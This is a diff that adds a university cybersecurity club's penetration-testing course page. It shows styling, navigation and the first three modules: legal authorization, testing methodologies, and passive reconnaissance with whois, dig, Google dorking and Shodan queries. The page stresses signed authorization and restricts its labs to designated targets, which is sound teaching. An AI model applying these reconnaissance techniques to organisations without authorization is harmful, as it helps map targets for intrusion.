@@ -1,0 +1,1416 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Penetration Testing — Cybersecurity Club UTB</title>
+  <link rel="stylesheet" href="assets/css/styles.css?v=notif4" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm/css/xterm.css" />
+  <script src="https://cdn.jsdelivr.net/npm/xterm/lib/xterm.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit/lib/xterm-addon-fit.js"></script>
+  <style>
+    body { background: #0a0a0d; }
+    .nf-layout { display: grid; grid-template-columns: 260px 1fr; gap: 28px; max-width: 1400px; margin: 0 auto; }
+    .nf-toc {
+      background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border);
+      border-radius: 18px; padding: 18px 14px; height: calc(100vh - 140px);
+      overflow-y: auto; position: sticky; top: 90px;
+    }
+    .nf-toc h4 { margin: 0 0 12px 4px; font-size: 14px; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; }
+    .nf-toc a { display: block; padding: 9px 12px; border-radius: 10px; font-size: 13px; color: var(--text); text-decoration: none; margin-bottom: 3px; transition: background 0.15s, color 0.15s; }
+    .nf-toc a:hover { background: rgba(255, 255, 255, 0.06); }
+    .nf-toc a.active { background: rgba(255, 95, 86, 0.18); color: #ff5f56; font-weight: 600; }
+    .nf-toc a .num { font-family: monospace; color: #ff5f56; margin-right: 8px; font-size: 11px; }
+    .nf-content { min-width: 0; }
+    .back-button { display: inline-flex; align-items: center; gap: 8px; color: var(--muted); margin-bottom: 16px; cursor: pointer; text-decoration: none; }
+    .back-button:hover { color: var(--accent); }
+
+    .module {
+      background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border);
+      border-radius: 20px; padding: 28px 30px; margin-bottom: 28px; scroll-margin-top: 100px;
+    }
+    .module-label { display: inline-block; font-family: monospace; font-size: 12px; letter-spacing: 2px; color: #ff5f56; font-weight: 700; margin-bottom: 8px; }
+    .module h2 { margin: 0 0 8px; font-size: 26px; }
+    .module .lead { color: var(--muted); font-size: 15px; line-height: 1.65; margin: 0 0 18px; }
+    .module h3 { font-size: 18px; margin: 22px 0 10px; color: #ff5f56; }
+    .module p { line-height: 1.65; color: #ccc; font-size: 14px; }
+    .module ul, .module ol { line-height: 1.7; color: #ccc; font-size: 14px; padding-left: 22px; }
+    .module li { margin-bottom: 6px; }
+    .module strong { color: #fff; }
+    .module em { color: #eee; }
+    .module code {
+      background: rgba(0, 0, 0, 0.45); color: #ff8a8a; padding: 2px 6px;
+      border-radius: 4px; font-size: 12.5px; font-family: 'Menlo', 'Courier New', monospace;
+    }
+
+    .nf-table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; background: rgba(0, 0, 0, 0.2); border-radius: 10px; overflow: hidden; }
+    .nf-table th, .nf-table td { text-align: left; padding: 10px 14px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); vertical-align: top; }
+    .nf-table th { background: rgba(255, 95, 86, 0.14); color: #ff8a8a; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
+    .nf-table tr:last-child td { border-bottom: none; }
+
+    .tip, .warn { border-radius: 12px; padding: 14px 18px; margin: 16px 0; font-size: 13px; line-height: 1.6; }
+    .tip { background: rgba(60, 170, 255, 0.07); border-left: 4px solid #3caaff; color: #cde6ff; }
+    .tip strong { color: #3caaff; }
+    .warn { background: rgba(255, 95, 86, 0.08); border-left: 4px solid #ff5f56; color: #ffd0cd; }
+    .warn strong { color: #ff5f56; }
+
+    .cmd-block {
+      background: #050507; border: 1px solid #1f1f25; border-radius: 10px;
+      padding: 12px 16px; font-family: 'Menlo', 'Courier New', monospace;
+      color: #9ef7a7; font-size: 12.5px; margin: 10px 0; overflow-x: auto; line-height: 1.6;
+    }
+
+    /* ---- Per-chapter lab (task panel + terminal) ---- */
+    .chapter-lab { margin-top: 18px; padding-top: 14px; border-top: 1px dashed rgba(255, 95, 86, 0.30); }
+    .chapter-grid { display: grid; grid-template-columns: 320px 1fr; gap: 14px; }
+    @media (max-width: 1100px) { .chapter-grid { grid-template-columns: 1fr; } }
+    .task-panel {
+      background: rgba(255, 95, 86, 0.05); border: 1px solid rgba(255, 95, 86, 0.30);
+      border-radius: 14px; padding: 12px 14px; display: flex; flex-direction: column;
+    }
+    .task-panel-head {
+      display: flex; justify-content: space-between; align-items: center;
+      font-size: 13px; font-weight: 700; color: #ffd1cf;
+      margin-bottom: 10px; padding-bottom: 8px;
+      border-bottom: 1px solid rgba(255, 95, 86, 0.20);
+    }
+    .task-panel-head .task-xp {
+      background: rgba(255, 95, 86, 0.20); color: #ff8a8a;
+      padding: 3px 10px; border-radius: 20px; font-size: 11px; font-family: 'Menlo', monospace;
+    }
+    .task-list { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 8px; }
+    .task-list li {
+      display: flex; align-items: flex-start; gap: 10px; padding: 8px 10px;
+      background: rgba(0, 0, 0, 0.25); border-radius: 10px; font-size: 12.5px;
+      color: #ddd; line-height: 1.45; border: 1px solid transparent;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .task-list li .dot {
+      flex: 0 0 14px; width: 14px; height: 14px; border-radius: 50%;
+      border: 2px solid #ff5f56; margin-top: 2px;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .task-list li .title { flex: 1; }
+    .task-list li .xp { font-family: 'Menlo', monospace; font-size: 11px; color: #ff8a8a; white-space: nowrap; }
+    .task-list li.done { background: rgba(39, 201, 63, 0.1); border-color: rgba(39, 201, 63, 0.4); color: #bfe3c3; }
+    .task-list li.done .dot { background: #27c93f; border-color: #27c93f; box-shadow: 0 0 8px rgba(39, 201, 63, 0.6); }
+    .task-list li.done .title { text-decoration: line-through; text-decoration-color: rgba(39, 201, 63, 0.4); }
+    .task-list li.just-awarded { animation: task-pop 0.5s ease; }
+    @keyframes task-pop { 0% { transform: scale(1); } 40% { transform: scale(1.03); } 100% { transform: scale(1); } }
+
+    .xp-floater {
+      position: fixed; pointer-events: none; font-family: 'Menlo', monospace;
+      font-weight: 700; font-size: 16px; color: #27c93f;
+      text-shadow: 0 0 8px rgba(39, 201, 63, 0.6); z-index: 2000;
+      animation: xp-float 1.4s ease-out forwards;
+    }
+    @keyframes xp-float { 0% { transform: translateY(0); opacity: 1; } 100% { transform: translateY(-60px); opacity: 0; } }
+
+    /* ---- Toasts ---- */
+    #xpToastStack { position: fixed; right: 20px; bottom: 20px; z-index: 3000; display: flex; flex-direction: column; gap: 10px; pointer-events: none; max-width: 360px; }
+    .xp-toast {
+      pointer-events: auto;
+      background: linear-gradient(135deg, rgba(39, 201, 63, 0.18), rgba(255, 95, 86, 0.12));
+      border: 1px solid rgba(39, 201, 63, 0.55); border-radius: 12px;
+      padding: 12px 14px; color: #e3ffe7; font-size: 13px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5); backdrop-filter: blur(8px);
+      animation: xp-toast-in 0.35s ease;
+    }
+    .xp-toast.fading { animation: xp-toast-out 0.6s ease forwards; }
+    .xp-toast .head { display: flex; align-items: center; justify-content: space-between; gap: 10px; font-weight: 700; color: #27c93f; font-family: 'Menlo', monospace; font-size: 13px; }
+    .xp-toast .close { background: transparent; border: none; color: #ffd1cf; cursor: pointer; font-size: 14px; line-height: 1; padding: 0 4px; }
+    .xp-toast .body { margin-top: 4px; font-size: 12.5px; color: #d8e6cf; line-height: 1.4; }
+    @keyframes xp-toast-in  { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+    @keyframes xp-toast-out { from { transform: translateY(0); opacity: 1; } to { transform: translateY(-20px); opacity: 0; } }
+
+    /* ---- Lock overlay ---- */
+    article.module.chapter-locked { position: relative; filter: grayscale(0.6); }
+    article.module.chapter-locked > *:not(.chapter-lock-overlay) { opacity: 0.35; pointer-events: none; user-select: none; }
+    .chapter-lock-overlay {
+      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      display: flex; align-items: center; justify-content: center;
+      background: linear-gradient(180deg, rgba(10,10,13,0.55), rgba(10,10,13,0.85));
+      border-radius: 18px; z-index: 5; pointer-events: auto;
+    }
+    .chapter-lock-card {
+      max-width: 420px; text-align: center; background: rgba(20, 20, 28, 0.92);
+      border: 1px solid rgba(255, 95, 86, 0.45); border-radius: 16px;
+      padding: 22px 24px; color: #ffd1cf; box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+    }
+    .chapter-lock-card .icon { font-size: 32px; line-height: 1; }
+    .chapter-lock-card h4 { margin: 6px 0 8px; font-size: 16px; color: #ff8a8a; }
+    .chapter-lock-card p { margin: 0; font-size: 13px; color: #cdd6e3; line-height: 1.5; }
+
+    /* ---- Terminal ---- */
+    .chapter-term-wrap {
+      background: #0a0a0d; border-radius: 14px; border: 1px solid var(--border);
+      overflow: hidden; display: flex; flex-direction: column; min-height: 320px;
+    }
+    .chapter-term-head { background: #1a1a1a; padding: 10px 14px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #333; flex-shrink: 0; }
+    .chapter-term-head .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .chapter-term-head .terminal-dot.red    { background: #ff5f56; }
+    .chapter-term-head .terminal-dot.yellow { background: #ffbd2e; }
+    .chapter-term-head .terminal-dot.green  { background: #27c93f; }
+    .chapter-term-head .terminal-title { color: #888; font-size: 11px; margin-left: 8px; flex: 1; }
+    .chapter-term-head .terminal-status { font-size: 11px; padding: 2px 10px; border-radius: 20px; background: rgba(39, 201, 63, 0.15); color: #27c93f; }
+    .chapter-term-head .terminal-status.offline { background: rgba(255, 95, 86, 0.15); color: #ff8a8a; }
+    .chapter-terminal { flex: 1; padding: 10px; min-height: 280px; font-size: 12px; font-family: 'Menlo', 'Courier New', monospace; }
+
+    /* ---- Sticky XP bar ---- */
+    .course-xp-bar {
+      position: sticky; top: 72px; z-index: 50;
+      background: rgba(10, 10, 13, 0.95); backdrop-filter: blur(8px);
+      border: 1px solid var(--border); border-radius: 14px;
+      padding: 10px 16px; margin-bottom: 16px;
+      display: flex; align-items: center; gap: 14px; flex-wrap: wrap;
+    }
+    .course-xp-bar .label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; }
+    .course-xp-bar .value { font-family: 'Menlo', monospace; font-weight: 700; color: #ff5f56; font-size: 14px; }
+    .course-xp-bar .xp-track { flex: 1; min-width: 160px; height: 6px; background: rgba(255, 255, 255, 0.08); border-radius: 3px; overflow: hidden; }
+    .course-xp-bar .xp-fill { height: 100%; background: linear-gradient(90deg, #ff5f56, #ff8a2e); width: 0%; transition: width 0.5s ease; }
+    .course-xp-bar .chapters-done { font-size: 12px; color: var(--muted); }
+    .course-xp-bar .chapters-done strong { color: #fff; }
+
+    .nf-header-bar { display: flex; justify-content: space-between; align-items: center; gap: 16px; flex-wrap: wrap; margin-bottom: 18px; }
+    .nf-header-bar .stats { display: flex; gap: 12px; flex-wrap: wrap; }
+
+    .finish-box {
+      background: linear-gradient(135deg, rgba(255, 95, 86, 0.12), rgba(255, 138, 46, 0.08));
+      border: 1px solid #ff5f56; border-radius: 20px; padding: 28px 30px; text-align: center;
+    }
+    .finish-box h3 { margin: 0 0 6px; font-size: 22px; }
+    .finish-box p { color: var(--muted); margin: 6px 0 16px; font-size: 14px; }
+
+    @media (max-width: 1000px) {
+      .nf-layout { grid-template-columns: 1fr; }
+      .nf-toc { position: relative; top: 0; height: auto; max-height: none; }
+    }
+
+    /* ---- Method explainer cards (Objective / Weakness / Alternative) ---- */
+    .method-card {
+      display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; margin: 18px 0 10px;
+    }
+    @media (max-width: 900px) { .method-card { grid-template-columns: 1fr; } }
+    .method-card > div { border-radius: 12px; padding: 14px 16px; font-size: 13px; line-height: 1.6; }
+    .method-card .obj  { background: rgba(39, 201, 63, 0.08);  border: 1px solid rgba(39, 201, 63, 0.35);  color: #cdf3d2; }
+    .method-card .obj strong  { color: #27c93f; }
+    .method-card .weak { background: rgba(255, 95, 86, 0.08);  border: 1px solid rgba(255, 95, 86, 0.35);  color: #ffd0cd; }
+    .method-card .weak strong { color: #ff5f56; }
+    .method-card .alt  { background: rgba(60, 170, 255, 0.07); border: 1px solid rgba(60, 170, 255, 0.35); color: #cde6ff; }
+    .method-card .alt strong  { color: #3caaff; }
+    .method-card h4 { margin: 0 0 6px; font-size: 12px; letter-spacing: 1.5px; text-transform: uppercase; font-family: 'Menlo', monospace; }
+
+    /* ---- Diagrams ---- */
+    .crypto-scene {
+      background: rgba(0,0,0,0.35); border: 1px solid var(--border);
+      border-radius: 14px; padding: 14px; margin: 16px 0; display: block; overflow-x: auto;
+    }
+    .crypto-scene svg { display: block; margin: 0 auto; max-width: 100%; height: auto; }
+    .crypto-scene .caption { text-align: center; color: var(--muted); font-size: 12px; margin-top: 8px; font-style: italic; }
+
+    /* ---- Tools reference grid ---- */
+    .tools-section {
+      background: rgba(255, 255, 255, 0.02); border: 1px solid var(--border);
+      border-radius: 20px; padding: 28px 30px; margin: 28px 0;
+    }
+    .tools-section h2 { margin: 0 0 6px; font-size: 24px; color: #ff5f56; }
+    .tools-section .lead { color: var(--muted); font-size: 14px; margin: 0 0 18px; }
+    .tools-grid {
+      display: grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr));
+      gap: 12px; margin-top: 12px;
+    }
+    .tool-card {
+      background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 95, 86, 0.25);
+      border-radius: 12px; padding: 12px 14px;
+    }
+    .tool-card .name { font-family: 'Menlo', monospace; color: #ff8a8a; font-size: 14px; font-weight: 700; }
+    .tool-card .role { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+    .tool-card .desc { font-size: 12.5px; color: #cfd6e0; line-height: 1.5; margin: 0 0 6px; }
+    .tool-card .ex { font-family: 'Menlo', monospace; font-size: 11px; color: #9ef7a7; background: #050507; border-radius: 6px; padding: 6px 8px; margin-top: 6px; word-break: break-all; }
+
+    /* ---- Desktop Lab launch panel ---- */
+    .desktop-launch {
+      background: linear-gradient(135deg, rgba(255,95,86,0.10), rgba(60,170,255,0.08));
+      border: 1px solid rgba(255,95,86,0.45); border-radius: 18px;
+      padding: 22px 26px; margin: 20px 0 24px;
+      display: flex; align-items: center; gap: 22px; flex-wrap: wrap;
+    }
+    .desktop-launch .icon { font-size: 42px; line-height: 1; }
+    .desktop-launch .body { flex: 1; min-width: 240px; }
+    .desktop-launch h3 { margin: 0 0 4px; font-size: 18px; color: #fff; }
+    .desktop-launch p  { margin: 0; font-size: 13px; color: #cfd6e0; line-height: 1.55; }
+    .desktop-launch .actions { display: flex; gap: 10px; flex-wrap: wrap; }
+    .desktop-launch .btn-launch {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: linear-gradient(135deg, #ff5f56, #ff8a2e);
+      color: #0a0a0d; font-weight: 700; font-size: 14px;
+      border: none; border-radius: 10px; padding: 10px 18px; cursor: pointer;
+    }
+    .desktop-launch .btn-launch:hover { filter: brightness(1.1); }
+    .desktop-launch .btn-launch[disabled] { opacity: 0.6; cursor: progress; }
+    .desktop-launch .btn-stop {
+      display: none; align-items: center; gap: 8px;
+      background: transparent; color: #ff8a8a; font-weight: 600; font-size: 13px;
+      border: 1px solid rgba(255,95,86,0.5); border-radius: 10px; padding: 9px 14px; cursor: pointer;
+    }
+    .desktop-launch .btn-stop:hover { background: rgba(255,95,86,0.10); }
+    .desktop-launch #desktopLaunchStatus {
+      font-size: 12px; font-family: 'Menlo', monospace;
+      color: var(--muted); margin-top: 6px;
+    }
+    .desktop-launch #desktopLaunchStatus[data-state="ok"]      { color: #27c93f; }
+    .desktop-launch #desktopLaunchStatus[data-state="loading"] { color: #ffbd2e; }
+    .desktop-launch #desktopLaunchStatus[data-state="warn"]    { color: #ffbd2e; }
+    .desktop-launch #desktopLaunchStatus[data-state="error"]   { color: #ff5f56; }
+
+    /* ---- Fullscreen modal hosting the noVNC iframe ---- */
+    #desktopModal {
+      position: fixed; inset: 0; z-index: 5000;
+      display: none; flex-direction: column;
+      background: #0a0a0d;
+    }
+    #desktopModal .head {
+      display: flex; align-items: center; gap: 14px;
+      padding: 10px 18px; background: #15151b;
+      border-bottom: 1px solid var(--border);
+    }
+    #desktopModal .head .label { color: #ff5f56; font-family: 'Menlo', monospace; font-size: 13px; font-weight: 700; }
+    #desktopModal .head .spacer { flex: 1; }
+    #desktopModal .head button {
+      background: transparent; color: #ddd; border: 1px solid rgba(255,255,255,0.18);
+      padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px;
+    }
+    #desktopModal .head button:hover { border-color: #ff5f56; color: #ff8a8a; }
+    #desktopFrame { flex: 1; width: 100%; height: 100%; border: 0; background: #0a0a0d; }
+  </style>
+</head>
+
+<body>
+  <header class="header">
+    <div class="container nav">
+      <a class="logo logo-utb" href="https://www.utb.edu.bh/" target="_blank" rel="noopener" aria-label="University of Technology Bahrain">
+        <img src="assets/images/utblogo.png" alt="University of Technology Bahrain">
+      </a>
+      <a class="logo logo-club" href="index.html"><img src="assets/images/logo.png?v=2" alt="Cybersecurity Club UTB"></a>
+      <div class="auth-controls" data-auth-controls></div>
+      <button class="menu-toggle" aria-label="Toggle menu"></button>
+      <nav class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="about.html">About Us</a>
+        <a href="news.html">News</a>
+        <a href="join.html">Apply to Join</a>
+        <a href="dashboard.html">Dashboard</a>
+        <a href="events.html">Events</a>
+        <a href="learning.html">Learning</a>
+        <a href="resources.html">Resources</a>
+        <a href="tracks.html">Cybersecurity Areas</a>
+        <a href="plan.html">Plan</a>
+        <a href="login.html">Login</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="page-hero">
+    <div class="container">
+      <a class="back-button" href="learning.html">Back to Learning Paths</a>
+      <span class="eyebrow">Penetration Testing Track</span>
+      <h1 style="margin-top:14px">Penetration Testing</h1>
+      <p>The largest path on the platform — twelve connected chapters that walk you from
+        the legal paperwork that has to happen <em>before</em> any test, through
+        reconnaissance, scanning, web exploitation, system exploitation, password
+        attacks, privilege escalation and finally writing the report. Every
+        chapter ends with a hands-on lab in a Kali sandbox terminal that earns
+        XP for the dashboard and the leaderboard.</p>
+    </div>
+  </section>
+
+  <section class="section" style="padding-top: 0;">
+    <div class="container">
+      <div class="course-xp-bar" id="courseXpBar">
+        <span class="label">Course XP</span>
+        <span class="value" id="courseXpValue">0 / 0</span>
+        <div class="xp-track"><div class="xp-fill" id="courseXpFill"></div></div>
+        <span class="chapters-done"><strong id="chaptersDone">0</strong> / 12 chapters complete</span>
+      </div>
+
+      <div class="nf-header-bar">
+        <div class="stats">
+          <span class="chip">Beginner-friendly</span>
+          <span class="chip">12 Chapters</span>
+          <span class="chip">48 Lab Tasks</span>
+          <span class="chip">~12 Hours</span>
+        </div>
+      </div>
+
+      <div class="nf-layout">
+        <aside class="nf-toc" id="nfToc">
+          <h4>Curriculum</h4>
+          <a href="#m1"><span class="num">01</span>Ethics &amp; Authorization</a>
+          <a href="#m2"><span class="num">02</span>Methodologies &amp; Box Types</a>
+          <a href="#m3"><span class="num">03</span>Passive Recon &amp; OSINT</a>
+          <a href="#m4"><span class="num">04</span>Active Recon — Nmap</a>
+          <a href="#m5"><span class="num">05</span>Service Enumeration</a>
+          <a href="#m6"><span class="num">06</span>Vulnerability Identification</a>
+          <a href="#m7"><span class="num">07</span>Network Sniffing &amp; MITM</a>
+          <a href="#m8"><span class="num">08</span>Web — XSS</a>
+          <a href="#m9"><span class="num">09</span>Web — SQL Injection</a>
+          <a href="#m10"><span class="num">10</span>Burp Suite &amp; HTTP</a>
+          <a href="#m11"><span class="num">11</span>System — Metasploit</a>
+          <a href="#m12"><span class="num">12</span>Passwords, Privesc &amp; Reporting</a>
+          <a href="#tools"><span class="num">★</span>Tools Reference</a>
+          <a href="#finish"><span class="num"></span>Capstone</a>
+        </aside>
+
+        <main class="nf-content">
+
+          <!-- ============================ MODULE 1 ============================ -->
+          <article class="module" id="m1">
+            <div class="module-label">MODULE 01 · ETHICS</div>
+            <h2>Before you scan a single port</h2>
+            <p class="lead">
+              A penetration test is a controlled, written-down, agreed-with-the-client
+              attack on systems someone else owns. Without that paperwork it is just
+              a crime. The first chapter is the only one where you don't run any
+              tools — but it is also the chapter that decides whether your career
+              survives the next eleven.
+            </p>
+
+            <h3>The four documents every engagement needs</h3>
+            <ul>
+              <li><strong>Statement of Work (SOW)</strong> — what you are being paid to do, by when, for how much.</li>
+              <li><strong>Rules of Engagement (ROE)</strong> — exactly which targets, dates, hours, techniques are allowed and forbidden.</li>
+              <li><strong>Authorization Letter</strong> — countersigned proof you can show to anyone (incident responders, ISP, police) that says &ldquo;yes, this person is allowed to test these systems&rdquo;.</li>
+              <li><strong>Non-Disclosure Agreement (NDA)</strong> — binding promise that the secrets you find don't leave the engagement.</li>
+            </ul>
+
+            <div class="crypto-scene">
+              <svg viewBox="0 0 760 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Pre-engagement workflow: NDA, scope, ROE, authorization signed before any test starts.">
+                <defs>
+                  <marker id="arrR" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                    <path d="M0,0 L10,5 L0,10 z" fill="#ff5f56"/>
+                  </marker>
+                </defs>
+                <g font-family="Menlo" font-size="12" fill="#fff">
+                  <rect x="20"  y="60" width="120" height="60" rx="10" fill="#1a1a22" stroke="#3caaff"/>
+                  <text x="80"  y="85"  text-anchor="middle" fill="#3caaff">1. NDA</text>
+                  <text x="80"  y="105" text-anchor="middle" fill="#9aa6b2" font-size="10">protect secrets</text>
+                  <rect x="170" y="60" width="120" height="60" rx="10" fill="#1a1a22" stroke="#ffbd2e"/>
+                  <text x="230" y="85"  text-anchor="middle" fill="#ffbd2e">2. SOW</text>
+                  <text x="230" y="105" text-anchor="middle" fill="#9aa6b2" font-size="10">deliverables</text>
+                  <rect x="320" y="60" width="120" height="60" rx="10" fill="#1a1a22" stroke="#ff5f56"/>
+                  <text x="380" y="85"  text-anchor="middle" fill="#ff5f56">3. ROE</text>
+                  <text x="380" y="105" text-anchor="middle" fill="#9aa6b2" font-size="10">scope &amp; limits</text>
+                  <rect x="470" y="60" width="160" height="60" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="550" y="85"  text-anchor="middle" fill="#27c93f">4. Authorization</text>
+                  <text x="550" y="105" text-anchor="middle" fill="#9aa6b2" font-size="10">signed letter</text>
+                  <rect x="660" y="60" width="80"  height="60" rx="10" fill="#1a1a22" stroke="#27c93f"/>
+                  <text x="700" y="95"  text-anchor="middle" fill="#27c93f">TEST</text>
+                  <line x1="140" y1="90" x2="170" y2="90" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR)"/>
+                  <line x1="290" y1="90" x2="320" y2="90" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR)"/>
+                  <line x1="440" y1="90" x2="470" y2="90" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR)"/>
+                  <line x1="630" y1="90" x2="660" y2="90" stroke="#ff5f56" stroke-width="2" marker-end="url(#arrR)"/>
+                </g>
+              </svg>
+              <div class="caption">No box on the left signed? No green box on the right. The engagement does not start.</div>
+            </div>
+
+            <div class="warn">
+              <strong>Legal landmine.</strong> Pen-testing without written
+              authorization is a crime in nearly every jurisdiction. In the
+              U.S. it is the <em>Computer Fraud and Abuse Act</em>; in the
+              U.K. it is the <em>Computer Misuse Act 1990</em>; in Bahrain it
+              is the <em>Personal Data Protection Law (30/2018)</em> plus
+              <em>Cybercrime Decree-Law 60/2014</em>. Even a bare nmap scan
+              of a third-party network can land you in court.
+            </div>
+
+            <p>
+              In the lab you'll read four pre-built documents inside the
+              sandbox: <code>ROE.md</code>, <code>AUTHORIZATION-LETTER.txt</code>,
+              <code>LEGAL.md</code>, and the file <code>.target</code> that
+              names the only IP/hostname these labs are allowed to point at
+              (<code>scanme.nmap.org</code> + <code>localhost</code>).
+            </p>
+
+            <div class="chapter-lab" data-chapter="1"></div>
+
+            <p style="margin-top:14px">
+              Now that the paperwork is signed, the next chapter answers: which
+              way of testing did the client buy?
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 2 ============================ -->
+          <article class="module" id="m2">
+            <div class="module-label">MODULE 02 · METHODOLOGY</div>
+            <h2>White, grey, black — and which methodology you follow</h2>
+            <p class="lead">
+              Pen-tests come in three flavours depending on how much information
+              the client gives you. Every engagement also follows a
+              <em>methodology</em> — a checklist that tells reviewers, regulators
+              and the next tester after you what was actually done.
+            </p>
+
+            <h3>Box types</h3>
+            <div class="crypto-scene">
+              <svg viewBox="0 0 720 220" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="White, grey and black box: information level given to the tester.">
+                <g font-family="Menlo" font-size="12">
+                  <rect x="40"  y="40"  width="180" height="140" rx="14" fill="#1a1a22" stroke="#cfd6e0"/>
+                  <text x="130" y="65"  text-anchor="middle" fill="#fff" font-size="14">WHITE BOX</text>
+                  <text x="130" y="92"  text-anchor="middle" fill="#9aa6b2" font-size="11">full info</text>
+                  <text x="130" y="112" text-anchor="middle" fill="#cfd6e0" font-size="11">source code</text>
+                  <text x="130" y="128" text-anchor="middle" fill="#cfd6e0" font-size="11">diagrams</text>
+                  <text x="130" y="144" text-anchor="middle" fill="#cfd6e0" font-size="11">creds</text>
+                  <text x="130" y="166" text-anchor="middle" fill="#27c93f" font-size="11">depth +++</text>
+
+                  <rect x="270" y="40"  width="180" height="140" rx="14" fill="#1a1a22" stroke="#9aa6b2"/>
+                  <text x="360" y="65"  text-anchor="middle" fill="#fff" font-size="14">GREY BOX</text>
+                  <text x="360" y="92"  text-anchor="middle" fill="#9aa6b2" font-size="11">partial info</text>
+                  <text x="360" y="112" text-anchor="middle" fill="#cfd6e0" font-size="11">low-priv account</text>
+                  <text x="360" y="128" text-anchor="middle" fill="#cfd6e0" font-size="11">limited diagrams</text>
+                  <text x="360" y="144" text-anchor="middle" fill="#cfd6e0" font-size="11">most engagements</text>
+                  <text x="360" y="166" text-anchor="middle" fill="#ffbd2e" font-size="11">balanced</text>
+
+                  <rect x="500" y="40"  width="180" height="140" rx="14" fill="#1a1a22" stroke="#3a3a44"/>
+                  <text x="590" y="65"  text-anchor="middle" fill="#fff" font-size="14">BLACK BOX</text>
+                  <text x="590" y="92"  text-anchor="middle" fill="#9aa6b2" font-size="11">zero info</text>
+                  <text x="590" y="112" text-anchor="middle" fill="#cfd6e0" font-size="11">target list only</text>
+                  <text x="590" y="128" text-anchor="middle" fill="#cfd6e0" font-size="11">no creds</text>
+                  <text x="590" y="144" text-anchor="middle" fill="#cfd6e0" font-size="11">slowest</text>
+                  <text x="590" y="166" text-anchor="middle" fill="#ff5f56" font-size="11">realism +++</text>
+                </g>
+              </svg>
+              <div class="caption">The choice belongs to the client and is locked in the ROE — it is not a slider you can move during the test.</div>
+            </div>
+
+            <h3>Methodologies you can name in your report</h3>
+            <table class="nf-table">
+              <thead><tr><th>Standard</th><th>Use</th></tr></thead>
+              <tbody>
+                <tr><td><strong>PTES</strong></td><td>Penetration Testing Execution Standard. 7 phases. The default external-engagement structure.</td></tr>
+                <tr><td><strong>OWASP WSTG</strong></td><td>Web Security Testing Guide — the gold standard for testing a web app.</td></tr>
+                <tr><td><strong>NIST SP 800-115</strong></td><td>Technical Guide to Information Security Testing — used when the client must align with NIST 800-53 controls.</td></tr>
+                <tr><td><strong>OSSTMM</strong></td><td>Open Source Security Testing Methodology Manual — wider scope than PTES, common in audits.</td></tr>
+                <tr><td><strong>MITRE ATT&amp;CK</strong></td><td>Adversary-emulation reference. Useful for red-team / purple-team engagements that need to map findings to a known threat actor.</td></tr>
+              </tbody>
+            </table>
+
+            <p>
+              In the lab you'll read four pre-written cheat sheets inside the
+              sandbox: the methodologies overview, the box-type comparison, the
+              seven PTES phases, and the NIST SP 800-115 outline.
+            </p>
+
+            <div class="chapter-lab" data-chapter="2"></div>
+
+            <p style="margin-top:14px">
+              You know the rules and the playbook. Time to actually find out
+              what the target looks like — and chapter 3 does it without
+              touching them once.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 3 ============================ -->
+          <article class="module" id="m3">
+            <div class="module-label">MODULE 03 · OSINT</div>
+            <h2>Passive reconnaissance — learning without touching</h2>
+            <p class="lead">
+              Before you send a single packet to the target, you can learn an
+              embarrassing amount about them from public records. This is
+              <em>passive recon</em> or OSINT (Open-Source Intelligence). The
+              target's logs never show a thing, because every query goes to a
+              third party.
+            </p>
+
+            <h3>The four passive-recon staples</h3>
+            <table class="nf-table">
+              <thead><tr><th>Tool</th><th>What it tells you</th></tr></thead>
+              <tbody>
+                <tr><td><code>whois example.com</code></td><td>Registrar, registration date, contact emails, registered nameservers.</td></tr>
+                <tr><td><code>dig example.com</code></td><td>A records — the IPv4 addresses behind the hostname.</td></tr>
+                <tr><td><code>dig MX example.com</code></td><td>Mail servers — useful for phishing scope and email vendor identification.</td></tr>
+                <tr><td><code>dig -x 8.8.8.8</code></td><td>Reverse DNS — what hostname an IP claims to be.</td></tr>
+              </tbody>
+            </table>
+
+            <p>
+              Beyond DNS, OSINT also covers Google dorking
+              (<code>site:example.com filetype:pdf</code>), Shodan
+              (<code>org:"Example Corp"</code>), the Wayback Machine, the
+              employee directory on LinkedIn and any data breaches the company
+              has been involved in.
+            </p>
+
+            <div class="chapter-lab" data-chapter="3"></div>
+
+            <p style="margin-top:14px">
+              Passive recon ends when you've drawn the map. Chapter 4 is where
+              you start touching the target — carefully.
+            </p>
+          </article>
+
+          <!-- ============================ MODULE 4 ============================ -->
